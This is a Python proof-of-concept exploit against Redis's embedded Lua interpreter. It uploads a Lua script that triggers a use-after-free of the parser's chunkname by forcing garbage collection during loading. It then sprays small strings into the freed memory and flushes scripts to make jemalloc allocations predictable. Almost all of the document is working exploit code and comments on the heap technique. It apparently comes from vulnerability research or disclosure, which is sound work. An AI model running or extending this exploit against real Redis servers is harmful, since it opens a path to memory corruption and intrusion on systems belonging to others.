from redis import Redis

def get_smallstrs(amount: int) -> str:
    smallstrs = ""
    for i in range(0, amount):
        smallstrs += f'loadstring(\'local v{i:06} = "{i:07}"\')\n'
    return smallstrs

def main():
    r = Redis(host='127.0.0.1', port=6379, password=None)

    script = f"""
local index = 0
local function myloader ()
    local myindex = index
    index = index + 1
    if myindex == 0 then
        -- Before parsing, f_parser tries to populate the ZIO buffer by calling `luaZ_lookahead`.
        -- We return nil here so that it tries to populate the buffer again while chunkname is in
        -- a collectable state in `luaX_setinput`.
        return nil
    elseif myindex == 1 then
        -- Sweep sweep sweep
        collectgarbage("collect")
        {get_smallstrs(2)}
        return 'return __redis__err__handler().source'
    end
end

-- Must use the default chunkname here, otherwise the string value will be added to `Proto::k`
-- of the `@user_script` prototype and thus end up marked during GC.
local f = load(myloader)
return f()
    """

    # Remove all comment lines.
    script = '\n'.join([x for x in script.split('\n') if not x.lstrip().startswith('--')])

    # Flush scripts.
    # This reset the jemalloc tcache being used, which is very useful for consistent bin addressing.
    print('[+] Flushing scripts')
    r.script_flush('SYNC')

    print('[+] Uploading script')
    result = r.eval(script, 0)
    match result:
        case b"=(load)": print("Failed to replace chunkname after free")
        case chunkname: print(f"Replaced chunkname: {chunkname}")

if __name__ == "__main__":
    main()
